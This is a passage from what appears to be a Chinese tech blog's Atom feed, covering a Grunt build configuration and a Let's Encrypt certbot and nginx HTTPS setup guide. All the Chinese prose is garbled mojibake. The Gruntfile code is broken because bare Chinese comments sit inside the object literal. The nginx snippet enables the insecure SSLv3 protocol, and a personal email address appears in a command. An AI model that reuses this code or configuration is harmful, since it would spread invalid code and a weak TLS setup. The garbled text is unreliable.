class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;module.exports = &lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (grunt) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    grunt.initConfig(&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        pkg: grunt.file.readJSON(&lt;span class=&quot;string&quot;&gt;&#39;package.json&#39;&lt;/span&gt;),&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        connect:&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            yjklog:&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                options:&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    port:8088, ç«¯å£&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    base:&lt;span class=&quot;string&quot;&gt;&#39;yjklog/front&#39;&lt;/span&gt;, æ–‡ä»¶åå°çš„æ—¥å¿—æŸ¥è¯¢çš„&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    livereload:&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;, &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    hostname:&lt;span class=&quot;string&quot;&gt;&#39;192.168.1.133&#39;&lt;/span&gt; æœ¬æœºæœºå™¨&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#125;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            yjk:&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                options:&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    port:8080, ç«¯å£&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    base:&lt;span class=&quot;string&quot;&gt;&#39;yjk/front&#39;&lt;/span&gt;, åå°&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    livereload:&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    hostname:&lt;span class=&quot;string&quot;&gt;&#39;192.168.1.133&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#125;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            jgs:&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                options:&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    port:80,  ç«¯å£&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    base:&lt;span class=&quot;string&quot;&gt;&#39;yjk/jgs&#39;&lt;/span&gt;, é¡¹ç›®åå°è®¿é—®&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    livereload:&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    hostname:&lt;span class=&quot;string&quot;&gt;&#39;192.168.1.182&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        watch: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            options: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                livereload: &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;%= connect.yjklog.options.livereload %&amp;gt;&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#125;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            files: [&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;%= pkg.root %&amp;gt;/app/**/*&#39;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;%= pkg.root %&amp;gt;/assets/**/*&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            ]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    grunt.loadNpmTasks(&lt;span class=&quot;string&quot;&gt;&#39;grunt-contrib-connect&#39;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    grunt.loadNpmTasks(&lt;span class=&quot;string&quot;&gt;&#39;grunt-contrib-watch&#39;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    grunt.registerTask(&lt;span class=&quot;string&quot;&gt;&#39;default&#39;&lt;/span&gt;, [&lt;span class=&quot;string&quot;&gt;&#39;connect&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;watch&#39;&lt;/span&gt;]);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æ‰€æœ‰åœ¨Gruntfile.js é…ç½®äº†2ä¸ªgruntæ’ä»¶:grunt-contrib-connect å’Œ grunt-contrib-watch&lt;br&gt;å¦‚æœé¡¹ç›®åªéœ€è¦å‹ç¼©jså’Œcssæ–‡ä»¶ã€‚æ‰€æœ‰åœ¨Gruntfile.js é…ç½®äº†2ä¸ªgruntæ’ä»¶ï¼š grunt-contrib-uglify å’Œ grunt-contrib-cssmin&lt;/p&gt;
&lt;h3 id=&quot;å®‰è£…-grunt-æ’ä»¶ï¼š&quot;&gt;&lt;a href=&quot;#å®‰è£…-grunt-æ’ä»¶ï¼š&quot; class=&quot;headerlink&quot; title=&quot;å®‰è£… grunt æ’ä»¶ï¼š&quot;&gt;&lt;/a&gt;å®‰è£… grunt æ’ä»¶ï¼š&lt;/h3&gt;&lt;p&gt;åœ¨git å®¢æˆ·ç«¯é”®å…¥å‘½ä»¤ cd  /health-Grunt; &lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;é”®å…¥å‘½ä»¤ npm install grunt-contrib-watch  å®‰è£…watch&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;é”®å…¥å‘½ä»¤ npm install grunt-contrib-connect å®‰è£…connect&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;é”®å…¥å‘½ä»¤ npm install grunt-contrib-uglify  å®‰è£…uglify&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;é”®å…¥å‘½ä»¤ npm install  grunt-contrib-cssmin  å®‰è£…cssmin&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å®˜æ–¹çš„çš„è¯ï¼šæŸ¥çœ‹ç¬¬4æ­¥&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;4ã€ å‡†å¤‡ç›¸å…³èµ„æ–™&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;åœ¨ &lt;span class=&quot;built_in&quot;&gt;test&lt;/span&gt;Grunt ç›®å½•ä¸‹ï¼Œåˆ›å»º jsç›®å½•ï¼Œå¹¶åœ¨jsç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶config.js  smeite.js index.js ï¼Œåˆ›å»ºcssç›®å½•ï¼Œå¹¶åœ¨cssç›®å½•ä¸‹åˆ›å»ºbase.css å’Œ global.cssã€‚ ï¼ˆè¿™äº›æ–‡ä»¶éƒ½åœ¨Gruntfile.js æœ‰é…ç½®ï¼Œæ‰€ä»¥éœ€è¦åˆ›å»ºï¼Œå†…å®¹å¯ä»¥éšæ„çš„å†™ï¼‰&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5ã€æ‰§è¡Œgrunt å‘½ä»¤&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;æ‰§è¡Œjså‹ç¼©å‘½ä»¤ grunt uglify æ•ˆæœå¦‚ä¸‹&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æˆ‘å‚è€ƒå®˜ç½‘ä¸Šé¢æˆ‘Gruntfile.js æœ‰é…ç½®ï¼Œéœ€è¦åˆ›å»ºè¿™äº›æ–‡ä»¶ç›®å½•ã€‚yjk,front,yjklog.&lt;br&gt;åé¢å°±æ˜¯å‰ç«¯äº‹æƒ…äº†ã€‚&lt;br&gt;å…·ä½“çš„å°±ä¸è¯¦è§£äº†ï¼&lt;br&gt;å¯ä»¥æŸ¥çœ‹æˆ‘githubä¸Šé¢æœ‰è¯¦ç»†çš„æ–‡æ¡£ã€‚&lt;/p&gt;
&lt;h3 id=&quot;å¯åŠ¨æœåŠ¡ï¼š&quot;&gt;&lt;a href=&quot;#å¯åŠ¨æœåŠ¡ï¼š&quot; class=&quot;headerlink&quot; title=&quot;å¯åŠ¨æœåŠ¡ï¼š&quot;&gt;&lt;/a&gt;å¯åŠ¨æœåŠ¡ï¼š&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;åœ¨ç›®å½•å½“å‰åå°å¯åŠ¨: grunt &amp;amp;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æ­å»ºåå°ï¼Œéœ€è¦å¯¹åå°çš„ç«¯å£å¼€æ”¾é˜²ç«å¢™è®¾ç½®ã€‚&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;æœ€è¿‘å¼„ç°åº¦å‘å¸ƒç³»ç»Ÿï¼Œç”±äºæœ€è¿‘ä½“æ£€é¡¹ç›®éœ€è¦å¯¹cssæ–‡ä»¶å’Œjsæ–‡ä»¶è¿›è¡Œå‹ç¼©ï¼Œå„ç§æ¯”è¾ƒä¹‹åï¼Œé€‰æ‹©äº†gruntè¿›è¡Œæ„å»ºã€‚googleä¸€ä¸‹ï¼Œå‡ ä¹éƒ½æ˜¯gruntæœ€æ–°ç‰ˆçš„ä½¿ç”¨è¯´æ˜ æŸ¥çœ‹gruntjsçš„å…¥é—¨ Getting startedï¼Œåˆæ˜¯äº‘é‡Œé›¾é‡Œçš„ï¼Œå¥½å§ï¼Œåªèƒ½è€å¿ƒçœ‹æ–‡æ¡£å’Œä¸æ–­çš„å®è·µå§
    
    </summary>
    
    
      <category term="node.js" scheme="http://blog.yangcvo.me/tags/node-js/"/>
    
      <category term="Grunt" scheme="http://blog.yangcvo.me/tags/Grunt/"/>
    
  </entry>
  
  <entry>
    <title>å…è´¹ Httpsè¯ä¹¦ï¼ˆLet&#39;S Encryptï¼‰ç”³è¯·ä¸é…ç½®</title>
    <link href="http://blog.yangcvo.me/2016/11/24/Web%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF/%E7%94%B3%E8%AF%B7%E8%AF%81%E4%B9%A6Https/%E5%85%8D%E8%B4%B9%20Https%20%E8%AF%81%E4%B9%A6%EF%BC%88Let'S%20Encrypt%EF%BC%89%E7%94%B3%E8%AF%B7%E4%B8%8E%E9%85%8D%E7%BD%AE%20/"/>
    <id>http://blog.yangcvo.me/2016/11/24/WebæœåŠ¡æŠ€æœ¯/ç”³è¯·è¯ä¹¦Https/å…è´¹ Https è¯ä¹¦ï¼ˆLet'S Encryptï¼‰ç”³è¯·ä¸é…ç½® /</id>
    <published>2016-11-24T09:25:23.000Z</published>
    <updated>2017-04-01T02:03:36.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;å…è´¹-Https-è¯ä¹¦ï¼ˆLetâ€™S-Encryptï¼‰ç”³è¯·ä¸é…ç½®&quot;&gt;&lt;a href=&quot;#å…è´¹-Https-è¯ä¹¦ï¼ˆLetâ€™S-Encryptï¼‰ç”³è¯·ä¸é…ç½®&quot; class=&quot;headerlink&quot; title=&quot;å…è´¹ Https è¯ä¹¦ï¼ˆLetâ€™S Encryptï¼‰ç”³è¯·ä¸é…ç½®&quot;&gt;&lt;/a&gt;å…è´¹ Https è¯ä¹¦ï¼ˆLetâ€™S Encryptï¼‰ç”³è¯·ä¸é…ç½®&lt;/h1&gt;&lt;p&gt;ä¹‹å‰è¦ç”³è¯·å…è´¹çš„ https è¯ä¹¦æ“ä½œæ­¥éª¤ç›¸å½“éº»çƒ¦ï¼Œä»Šå¤©çœ‹åˆ°æœ‰äººåœ¨è®¨è®ºï¼Œå°±æœç´¢äº†ä¸€ä¸‹ã€‚å‘ç°ç°åœ¨ç”³è¯·æ­¥éª¤ç®€å•å¤šäº†ã€‚&lt;/p&gt;
&lt;h2 id=&quot;1-ä¸‹è½½-certbot&quot;&gt;&lt;a href=&quot;#1-ä¸‹è½½-certbot&quot; class=&quot;headerlink&quot; title=&quot;1. ä¸‹è½½ certbot&quot;&gt;&lt;/a&gt;1. ä¸‹è½½ certbot&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;clone&lt;/span&gt; https://github.com/certbot/certbot&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; certbot&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;./certbot-auto --help&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;è§£å‹æ‰“å¼€æ‰§è¡Œå°±ä¼šæœ‰ç›¸å…³æç¤º&lt;/p&gt;
&lt;h2 id=&quot;2-ç”Ÿæˆå…è´¹è¯ä¹¦&quot;&gt;&lt;a href=&quot;#2-ç”Ÿæˆå…è´¹è¯ä¹¦&quot; class=&quot;headerlink&quot; title=&quot;2. ç”Ÿæˆå…è´¹è¯ä¹¦&quot;&gt;&lt;/a&gt;2. ç”Ÿæˆå…è´¹è¯ä¹¦&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;./certbot-auto certonly --webroot --agree-tos -v -t --email é‚®ç®±åœ°å€ -w ç½‘ç«™æ ¹ç›®å½• &lt;span class=&quot;_&quot;&gt;-d&lt;/span&gt; ç½‘ç«™åŸŸå&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;./certbot-auto certonly --webroot --agree-tos -v -t --email keeliizhou@gmail.com -w /path/to/your/web/root &lt;span class=&quot;_&quot;&gt;-d&lt;/span&gt; ihaozhuo.com&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æ³¨æ„ è¿™é‡Œ é»˜è®¤ä¼šè‡ªåŠ¨ç”Ÿæˆ /ç½‘ç«™æ ¹ç›®å½•/.well-known/acme-challengeï¼Œç„¶å shell è„šæœ¬ä¼šå¯¹åº”çš„è®¿é—® ç½‘ç«™åŸŸå&lt;code&gt;/.well-known/acme-challenge&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;å¦‚æœè¿”å›æ­£å¸¸å°±ç¡®è®¤äº†ä½ å¯¹è¿™ä¸ªç½‘ç«™çš„æ‰€æœ‰æƒï¼Œå°±èƒ½é¡ºåˆ©ç”Ÿæˆ&lt;/p&gt;
&lt;h2 id=&quot;3-è·å–è¯ä¹¦&quot;&gt;&lt;a href=&quot;#3-è·å–è¯ä¹¦&quot; class=&quot;headerlink&quot; title=&quot;3. è·å–è¯ä¹¦&quot;&gt;&lt;/a&gt;3. è·å–è¯ä¹¦&lt;/h2&gt;&lt;p&gt;å¦‚æœä¸Šé¢çš„æ­¥éª¤æ­£å¸¸ shell è„šæœ¬ä¼šå±•ç¤ºå¦‚ä¸‹ä¿¡æ¯ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;- Congratulations! Your certificate and chain have been saved at&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/etc/letsencrypt/live/ç½‘ç«™åŸŸå/fullchain.pem&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;...&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;4-ç”Ÿæˆ-dhparams&quot;&gt;&lt;a href=&quot;#4-ç”Ÿæˆ-dhparams&quot; class=&quot;headerlink&quot; title=&quot;4. ç”Ÿæˆ dhparams&quot;&gt;&lt;/a&gt;4. ç”Ÿæˆ dhparams&lt;/h2&gt;&lt;p&gt;ä½¿ç”¨ openssl å·¥å…·ç”Ÿæˆ dhparams&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;openssl dhparam -out /etc/ssl/certs/dhparams.pem 2048&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;5-é…ç½®-Nginx&quot;&gt;&lt;a href=&quot;#5-é…ç½®-Nginx&quot; class=&quot;headerlink&quot; title=&quot;5. é…ç½® Nginx&quot;&gt;&lt;/a&gt;5. é…ç½® Nginx&lt;/h2&gt;&lt;p&gt;æ‰“å¼€ nginx server é…ç½®æ–‡ä»¶åŠ å…¥å¦‚ä¸‹è®¾ç½®ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;listen 443&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ssl on;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ssl_certificate /etc/letsencrypt/live/ç½‘ç«™åŸŸå/fullchain.pem;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ssl_certificate_key /etc/letsencrypt/live/ç½‘ç«™åŸŸå/privkey.pem;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ssl_dhparam /etc/ssl/certs/dhparams.pem;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ssl_protocols SSLv3 TLSv1 TLSv1.1 TLSv1.2;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ssl_ciphers HIGH:!aNULL:!MD5;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ç„¶åé‡å¯ nginx æœåŠ¡å°±å¯ä»¥äº†&lt;/p&gt;
&lt;h2 id=&quot;6-å¼ºåˆ¶è·³è½¬-https&quot;&gt;&lt;a href=&quot;#6-å¼ºåˆ¶è·³è½¬-https&quot; class=&quot;headerlink&quot; title=&quot;6. å¼ºåˆ¶è·³è½¬ https&quot;&gt;&lt;/a&gt;6. å¼ºåˆ¶è·³è½¬ https&lt;/h2&gt;&lt;p&gt;https é»˜è®¤æ˜¯ç›‘å¬ 443 ç«¯å£çš„ï¼Œæ²¡å¼€å¯ https è®¿é—®çš„è¯ä¸€èˆ¬é»˜è®¤æ˜¯ 80 ç«¯å£ã€‚å¦‚æœä½ ç¡®å®šç½‘ç«™ 80 ç«¯å£ä¸Šçš„ç«™ç‚¹éƒ½æ”¯æŒ https çš„è¯åŠ å…¥ä¸‹é¢çš„é…ä»¶å¯ä»¥è‡ªåŠ¨é‡å®šå‘åˆ° https&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;server &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    listen 80;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    server_name your.domain.com;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;return&lt;/span&gt; 301 https://&lt;span class=&quot;variable&quot;&gt;$server_name&lt;/span&gt;&lt;span class=&quot;variable&quot;&gt;$request_uri&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;7-è¯ä¹¦æ›´æ–°&quot;&gt;&lt;a href=&quot;#7-è¯ä¹¦æ›´æ–°&quot; class=&quot;headerlink&quot; title=&quot;7. è¯ä¹¦æ›´æ–°&quot;&gt;&lt;/a&gt;7. è¯ä¹¦æ›´æ–°&lt;/h2&gt;&lt;p&gt;å…è´¹è¯ä¹¦åªæœ‰ 90 å¤©çš„æœ‰æ•ˆæœŸï¼Œåˆ°æ—¶éœ€è¦æ‰‹åŠ¨æ›´æ–° renewã€‚åˆšå¥½ Letâ€™s encrypt æ——ä¸‹è¿˜æœ‰ä¸€ä¸ª Letâ€™s monitor å…è´¹æœåŠ¡ï¼Œæ³¨å†Œè´¦å·æ·»åŠ éœ€è¦ç›‘æ§çš„åŸŸåï¼Œç³»ç»Ÿä¼šåœ¨è¯ä¹¦é©¬ä¸Šåˆ°æœŸæ—¶å‘å‡ºæé†’é‚®ä»¶ï¼Œéå¸¸æ–¹ä¾¿ã€‚æ”¶åˆ°é‚®ä»¶åå»åå°æ‰§è¡Œ renew å³å¯ï¼Œå¦‚æœæç¤ºæˆåŠŸå°±è¡¨ç¤º renew æˆåŠŸ&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;./certbot-auto renew&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;å…è´¹-Https-è¯ä¹¦ï¼ˆLetâ€™S-Encryptï¼‰ç”³è¯·ä¸é…ç½®&quot;&gt;&lt;a href=&quot;#å…è´¹-Https-è¯ä¹¦ï¼ˆLetâ€™S-Encryptï¼‰ç”³è¯·ä¸é…ç½®&quot; class=&quot;headerlink&quot; title=&quot;å…è´¹ Https è¯ä¹¦ï¼ˆLetâ€™S Encryptï¼‰ç”³è¯·ä¸é…
    
    </summary>
    
      <category term="nginx" scheme="http://blog.yangcvo.me/categories/nginx/"/>
    
    
      <category term="Web Service" scheme="http://blog.yangcvo.me/tags/Web-Service/"/>
    
      <category term="Nginx" scheme="http://blog.yangcvo.me/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>å¦‚ä½•åœ¨Nginxç”³è¯·å®‰è£…é…ç½®å…è´¹HTTPSè¯ä¹¦+é˜¿é‡Œäº‘SLBå¦‚ä½•é…ç½®HTTPS</title>
    <link href="http://blog.yangcvo.me/2016/11/23/Web%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF/%E7%94%B3%E8%AF%B7%E8%AF%81%E4%B9%A6Https/%E5%A6%82%E4%BD%95%E5%9C%A8Nginx%E7%94%B3%E8%AF%B7%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E5%85%8D%E8%B4%B9HTTPS%E8%AF%81%E4%B9%A6+%E9%98%BF%E9%87%8C%E4%BA%91SLB%E5%A6%82%E4%BD%95%E9%85%8D%E7%BD%AEHTTPS/"/>
    <id>http://blog.yangcvo.me/2016/11/23/WebæœåŠ¡æŠ€æœ¯/ç”³è¯·è¯ä¹¦Https/å¦‚ä½•åœ¨Nginxç”³è¯·å®‰è£…é…ç½®å…è´¹HTTPSè¯ä¹¦+é˜¿é‡Œäº‘SLBå¦‚ä½•é…ç½®HTTPS/</id>
    <published>2016-11-23T09:25:23.000Z</published>
    <updated>2017-03-31T17:04:58.000Z</updated>
    
